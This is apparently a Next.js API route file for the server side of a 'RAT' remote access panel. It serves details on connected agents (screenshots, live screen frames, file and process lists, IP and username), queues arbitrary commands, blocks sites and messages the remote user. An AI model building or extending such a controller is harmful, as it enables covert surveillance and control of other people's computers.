// app/api/rat/agents/[id]/route.ts
import { NextRequest, NextResponse } from 'next/server'
import sql from '@/lib/db'
import { getSession } from '@/lib/auth'

// GET /api/rat/agents/[id] - Get agent details
export async function GET(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await getSession()
  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const agentId = decodeURIComponent(params.id)

  try {
    const [agent] = await sql`
      SELECT 
        id, hostname, username, platform, ip, alias, last_seen,
        screenshot_b64, files_json, file_cwd, processes_json,
        (last_seen > NOW() - INTERVAL '15 seconds') AS connected
      FROM rat_agents 
      WHERE id = ${agentId}
    `

    if (!agent) {
      return NextResponse.json({ error: 'Agent not found' }, { status: 404 })
    }

    const [stream] = await sql`
      SELECT frame_b64, captured_at 
      FROM rat_stream_frames 
      WHERE agent_id = ${agentId}
    `

    const blocked = await sql`
      SELECT domain FROM rat_blocked_sites WHERE agent_id = ${agentId}
    `

    const messages = await sql`
      SELECT id, sender, body, created_at 
      FROM rat_messages 
      WHERE agent_id = ${agentId}
      ORDER BY created_at ASC 
      LIMIT 50
    `

    let files = null
    let file_cwd: string | null = null
    let processes = null

    try {
      if (agent.files_json) files = JSON.parse(agent.files_json)
      if (agent.file_cwd) file_cwd = agent.file_cwd
      if (agent.processes_json) processes = JSON.parse(agent.processes_json)
    } catch (e) {
      console.error('Failed to parse JSON for agent:', agentId, e)
    }

    return NextResponse.json({
      ...agent,
      stream_frame: stream?.frame_b64 ?? null,
      stream_updated_at: stream?.captured_at ?? null,
      blocked_sites: (blocked as { domain: string }[]).map(b => b.domain),
      messages: messages ?? [],
      files,
      file_cwd,
      processes,
    })
  } catch (error) {
    console.error('Error fetching agent details:', error)
    return NextResponse.json({ error: 'Database error' }, { status: 500 })
  }
}

// POST /api/rat/agents/[id] - Send command to agent
export async function POST(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await getSession()
  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const agentId = decodeURIComponent(params.id)

  try {
    const { type, payload } = await req.json()

    if (!type) {
      return NextResponse.json({ error: 'Command type required' }, { status: 400 })
    }

    if (type === 'screenshot') {
      await sql`UPDATE rat_agents SET screenshot_requested = TRUE WHERE id = ${agentId}`
      return NextResponse.json({ success: true, command_id: 'screenshot_flag', message: 'Screenshot requested' })
    }

    // FIX: persist admin messages to rat_messages immediately so they appear
    // in the chat history without waiting for the client to reply.
    if (type === 'message' && payload?.body) {
      await sql`
        INSERT INTO rat_messages (agent_id, sender, body)
        VALUES (${agentId}, 'admin', ${payload.body as string})
      `
    }

    // FIX: persist block/unblock immediately so the UI updates without waiting
    // for the client heartbeat to round-trip.
    if (type === 'block_sites' && Array.isArray(payload?.domains)) {
      for (const domain of payload.domains as string[]) {
        if (domain) await sql`
          INSERT INTO rat_blocked_sites (agent_id, domain)
          VALUES (${agentId}, ${domain})
          ON CONFLICT (agent_id, domain) DO NOTHING
        `
      }
    }

    if (type === 'unblock_sites' && Array.isArray(payload?.domains)) {
      const domains = payload.domains as string[]
      if (domains.length > 0) {
        await sql`
          DELETE FROM rat_blocked_sites
          WHERE agent_id = ${agentId}
          AND domain = ANY(${domains})
        `
      }
    }

    const [command] = await sql`
      INSERT INTO rat_commands (agent_id, type, payload)
      VALUES (${agentId}, ${type}, ${JSON.stringify(payload || {})})
      RETURNING id
    `

    return NextResponse.json({
      success: true,
      command_id: command.id,
      message: `Command ${type} queued for agent`,
    })
  } catch (error) {
    console.error('Error sending command:', error)
    return NextResponse.json({ error: 'Failed to send command' }, { status: 500 })
  }
}

// PATCH /api/rat/agents/[id] - Update agent alias
export async function PATCH(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await getSession()
  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const agentId = decodeURIComponent(params.id)

  try {
    const { alias } = await req.json()
    await sql`UPDATE rat_agents SET alias = ${alias || null} WHERE id = ${agentId}`
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Error updating agent:', error)
    return NextResponse.json({ error: 'Failed to update agent' }, { status: 500 })
  }
}

// DELETE /api/rat/agents/[id] - Remove agent and all related data
export async function DELETE(
  req: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await getSession()
  if (!session) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const agentId = decodeURIComponent(params.id)

  try {
    await sql`DELETE FROM rat_stream_frames WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_messages WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_blocked_sites WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_commands WHERE agent_id = ${agentId}`
    await sql`DELETE FROM rat_agents WHERE id = ${agentId}`
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Error deleting agent:', error)
    return NextResponse.json({ error: 'Failed to delete agent' }, { status: 500 })
  }
}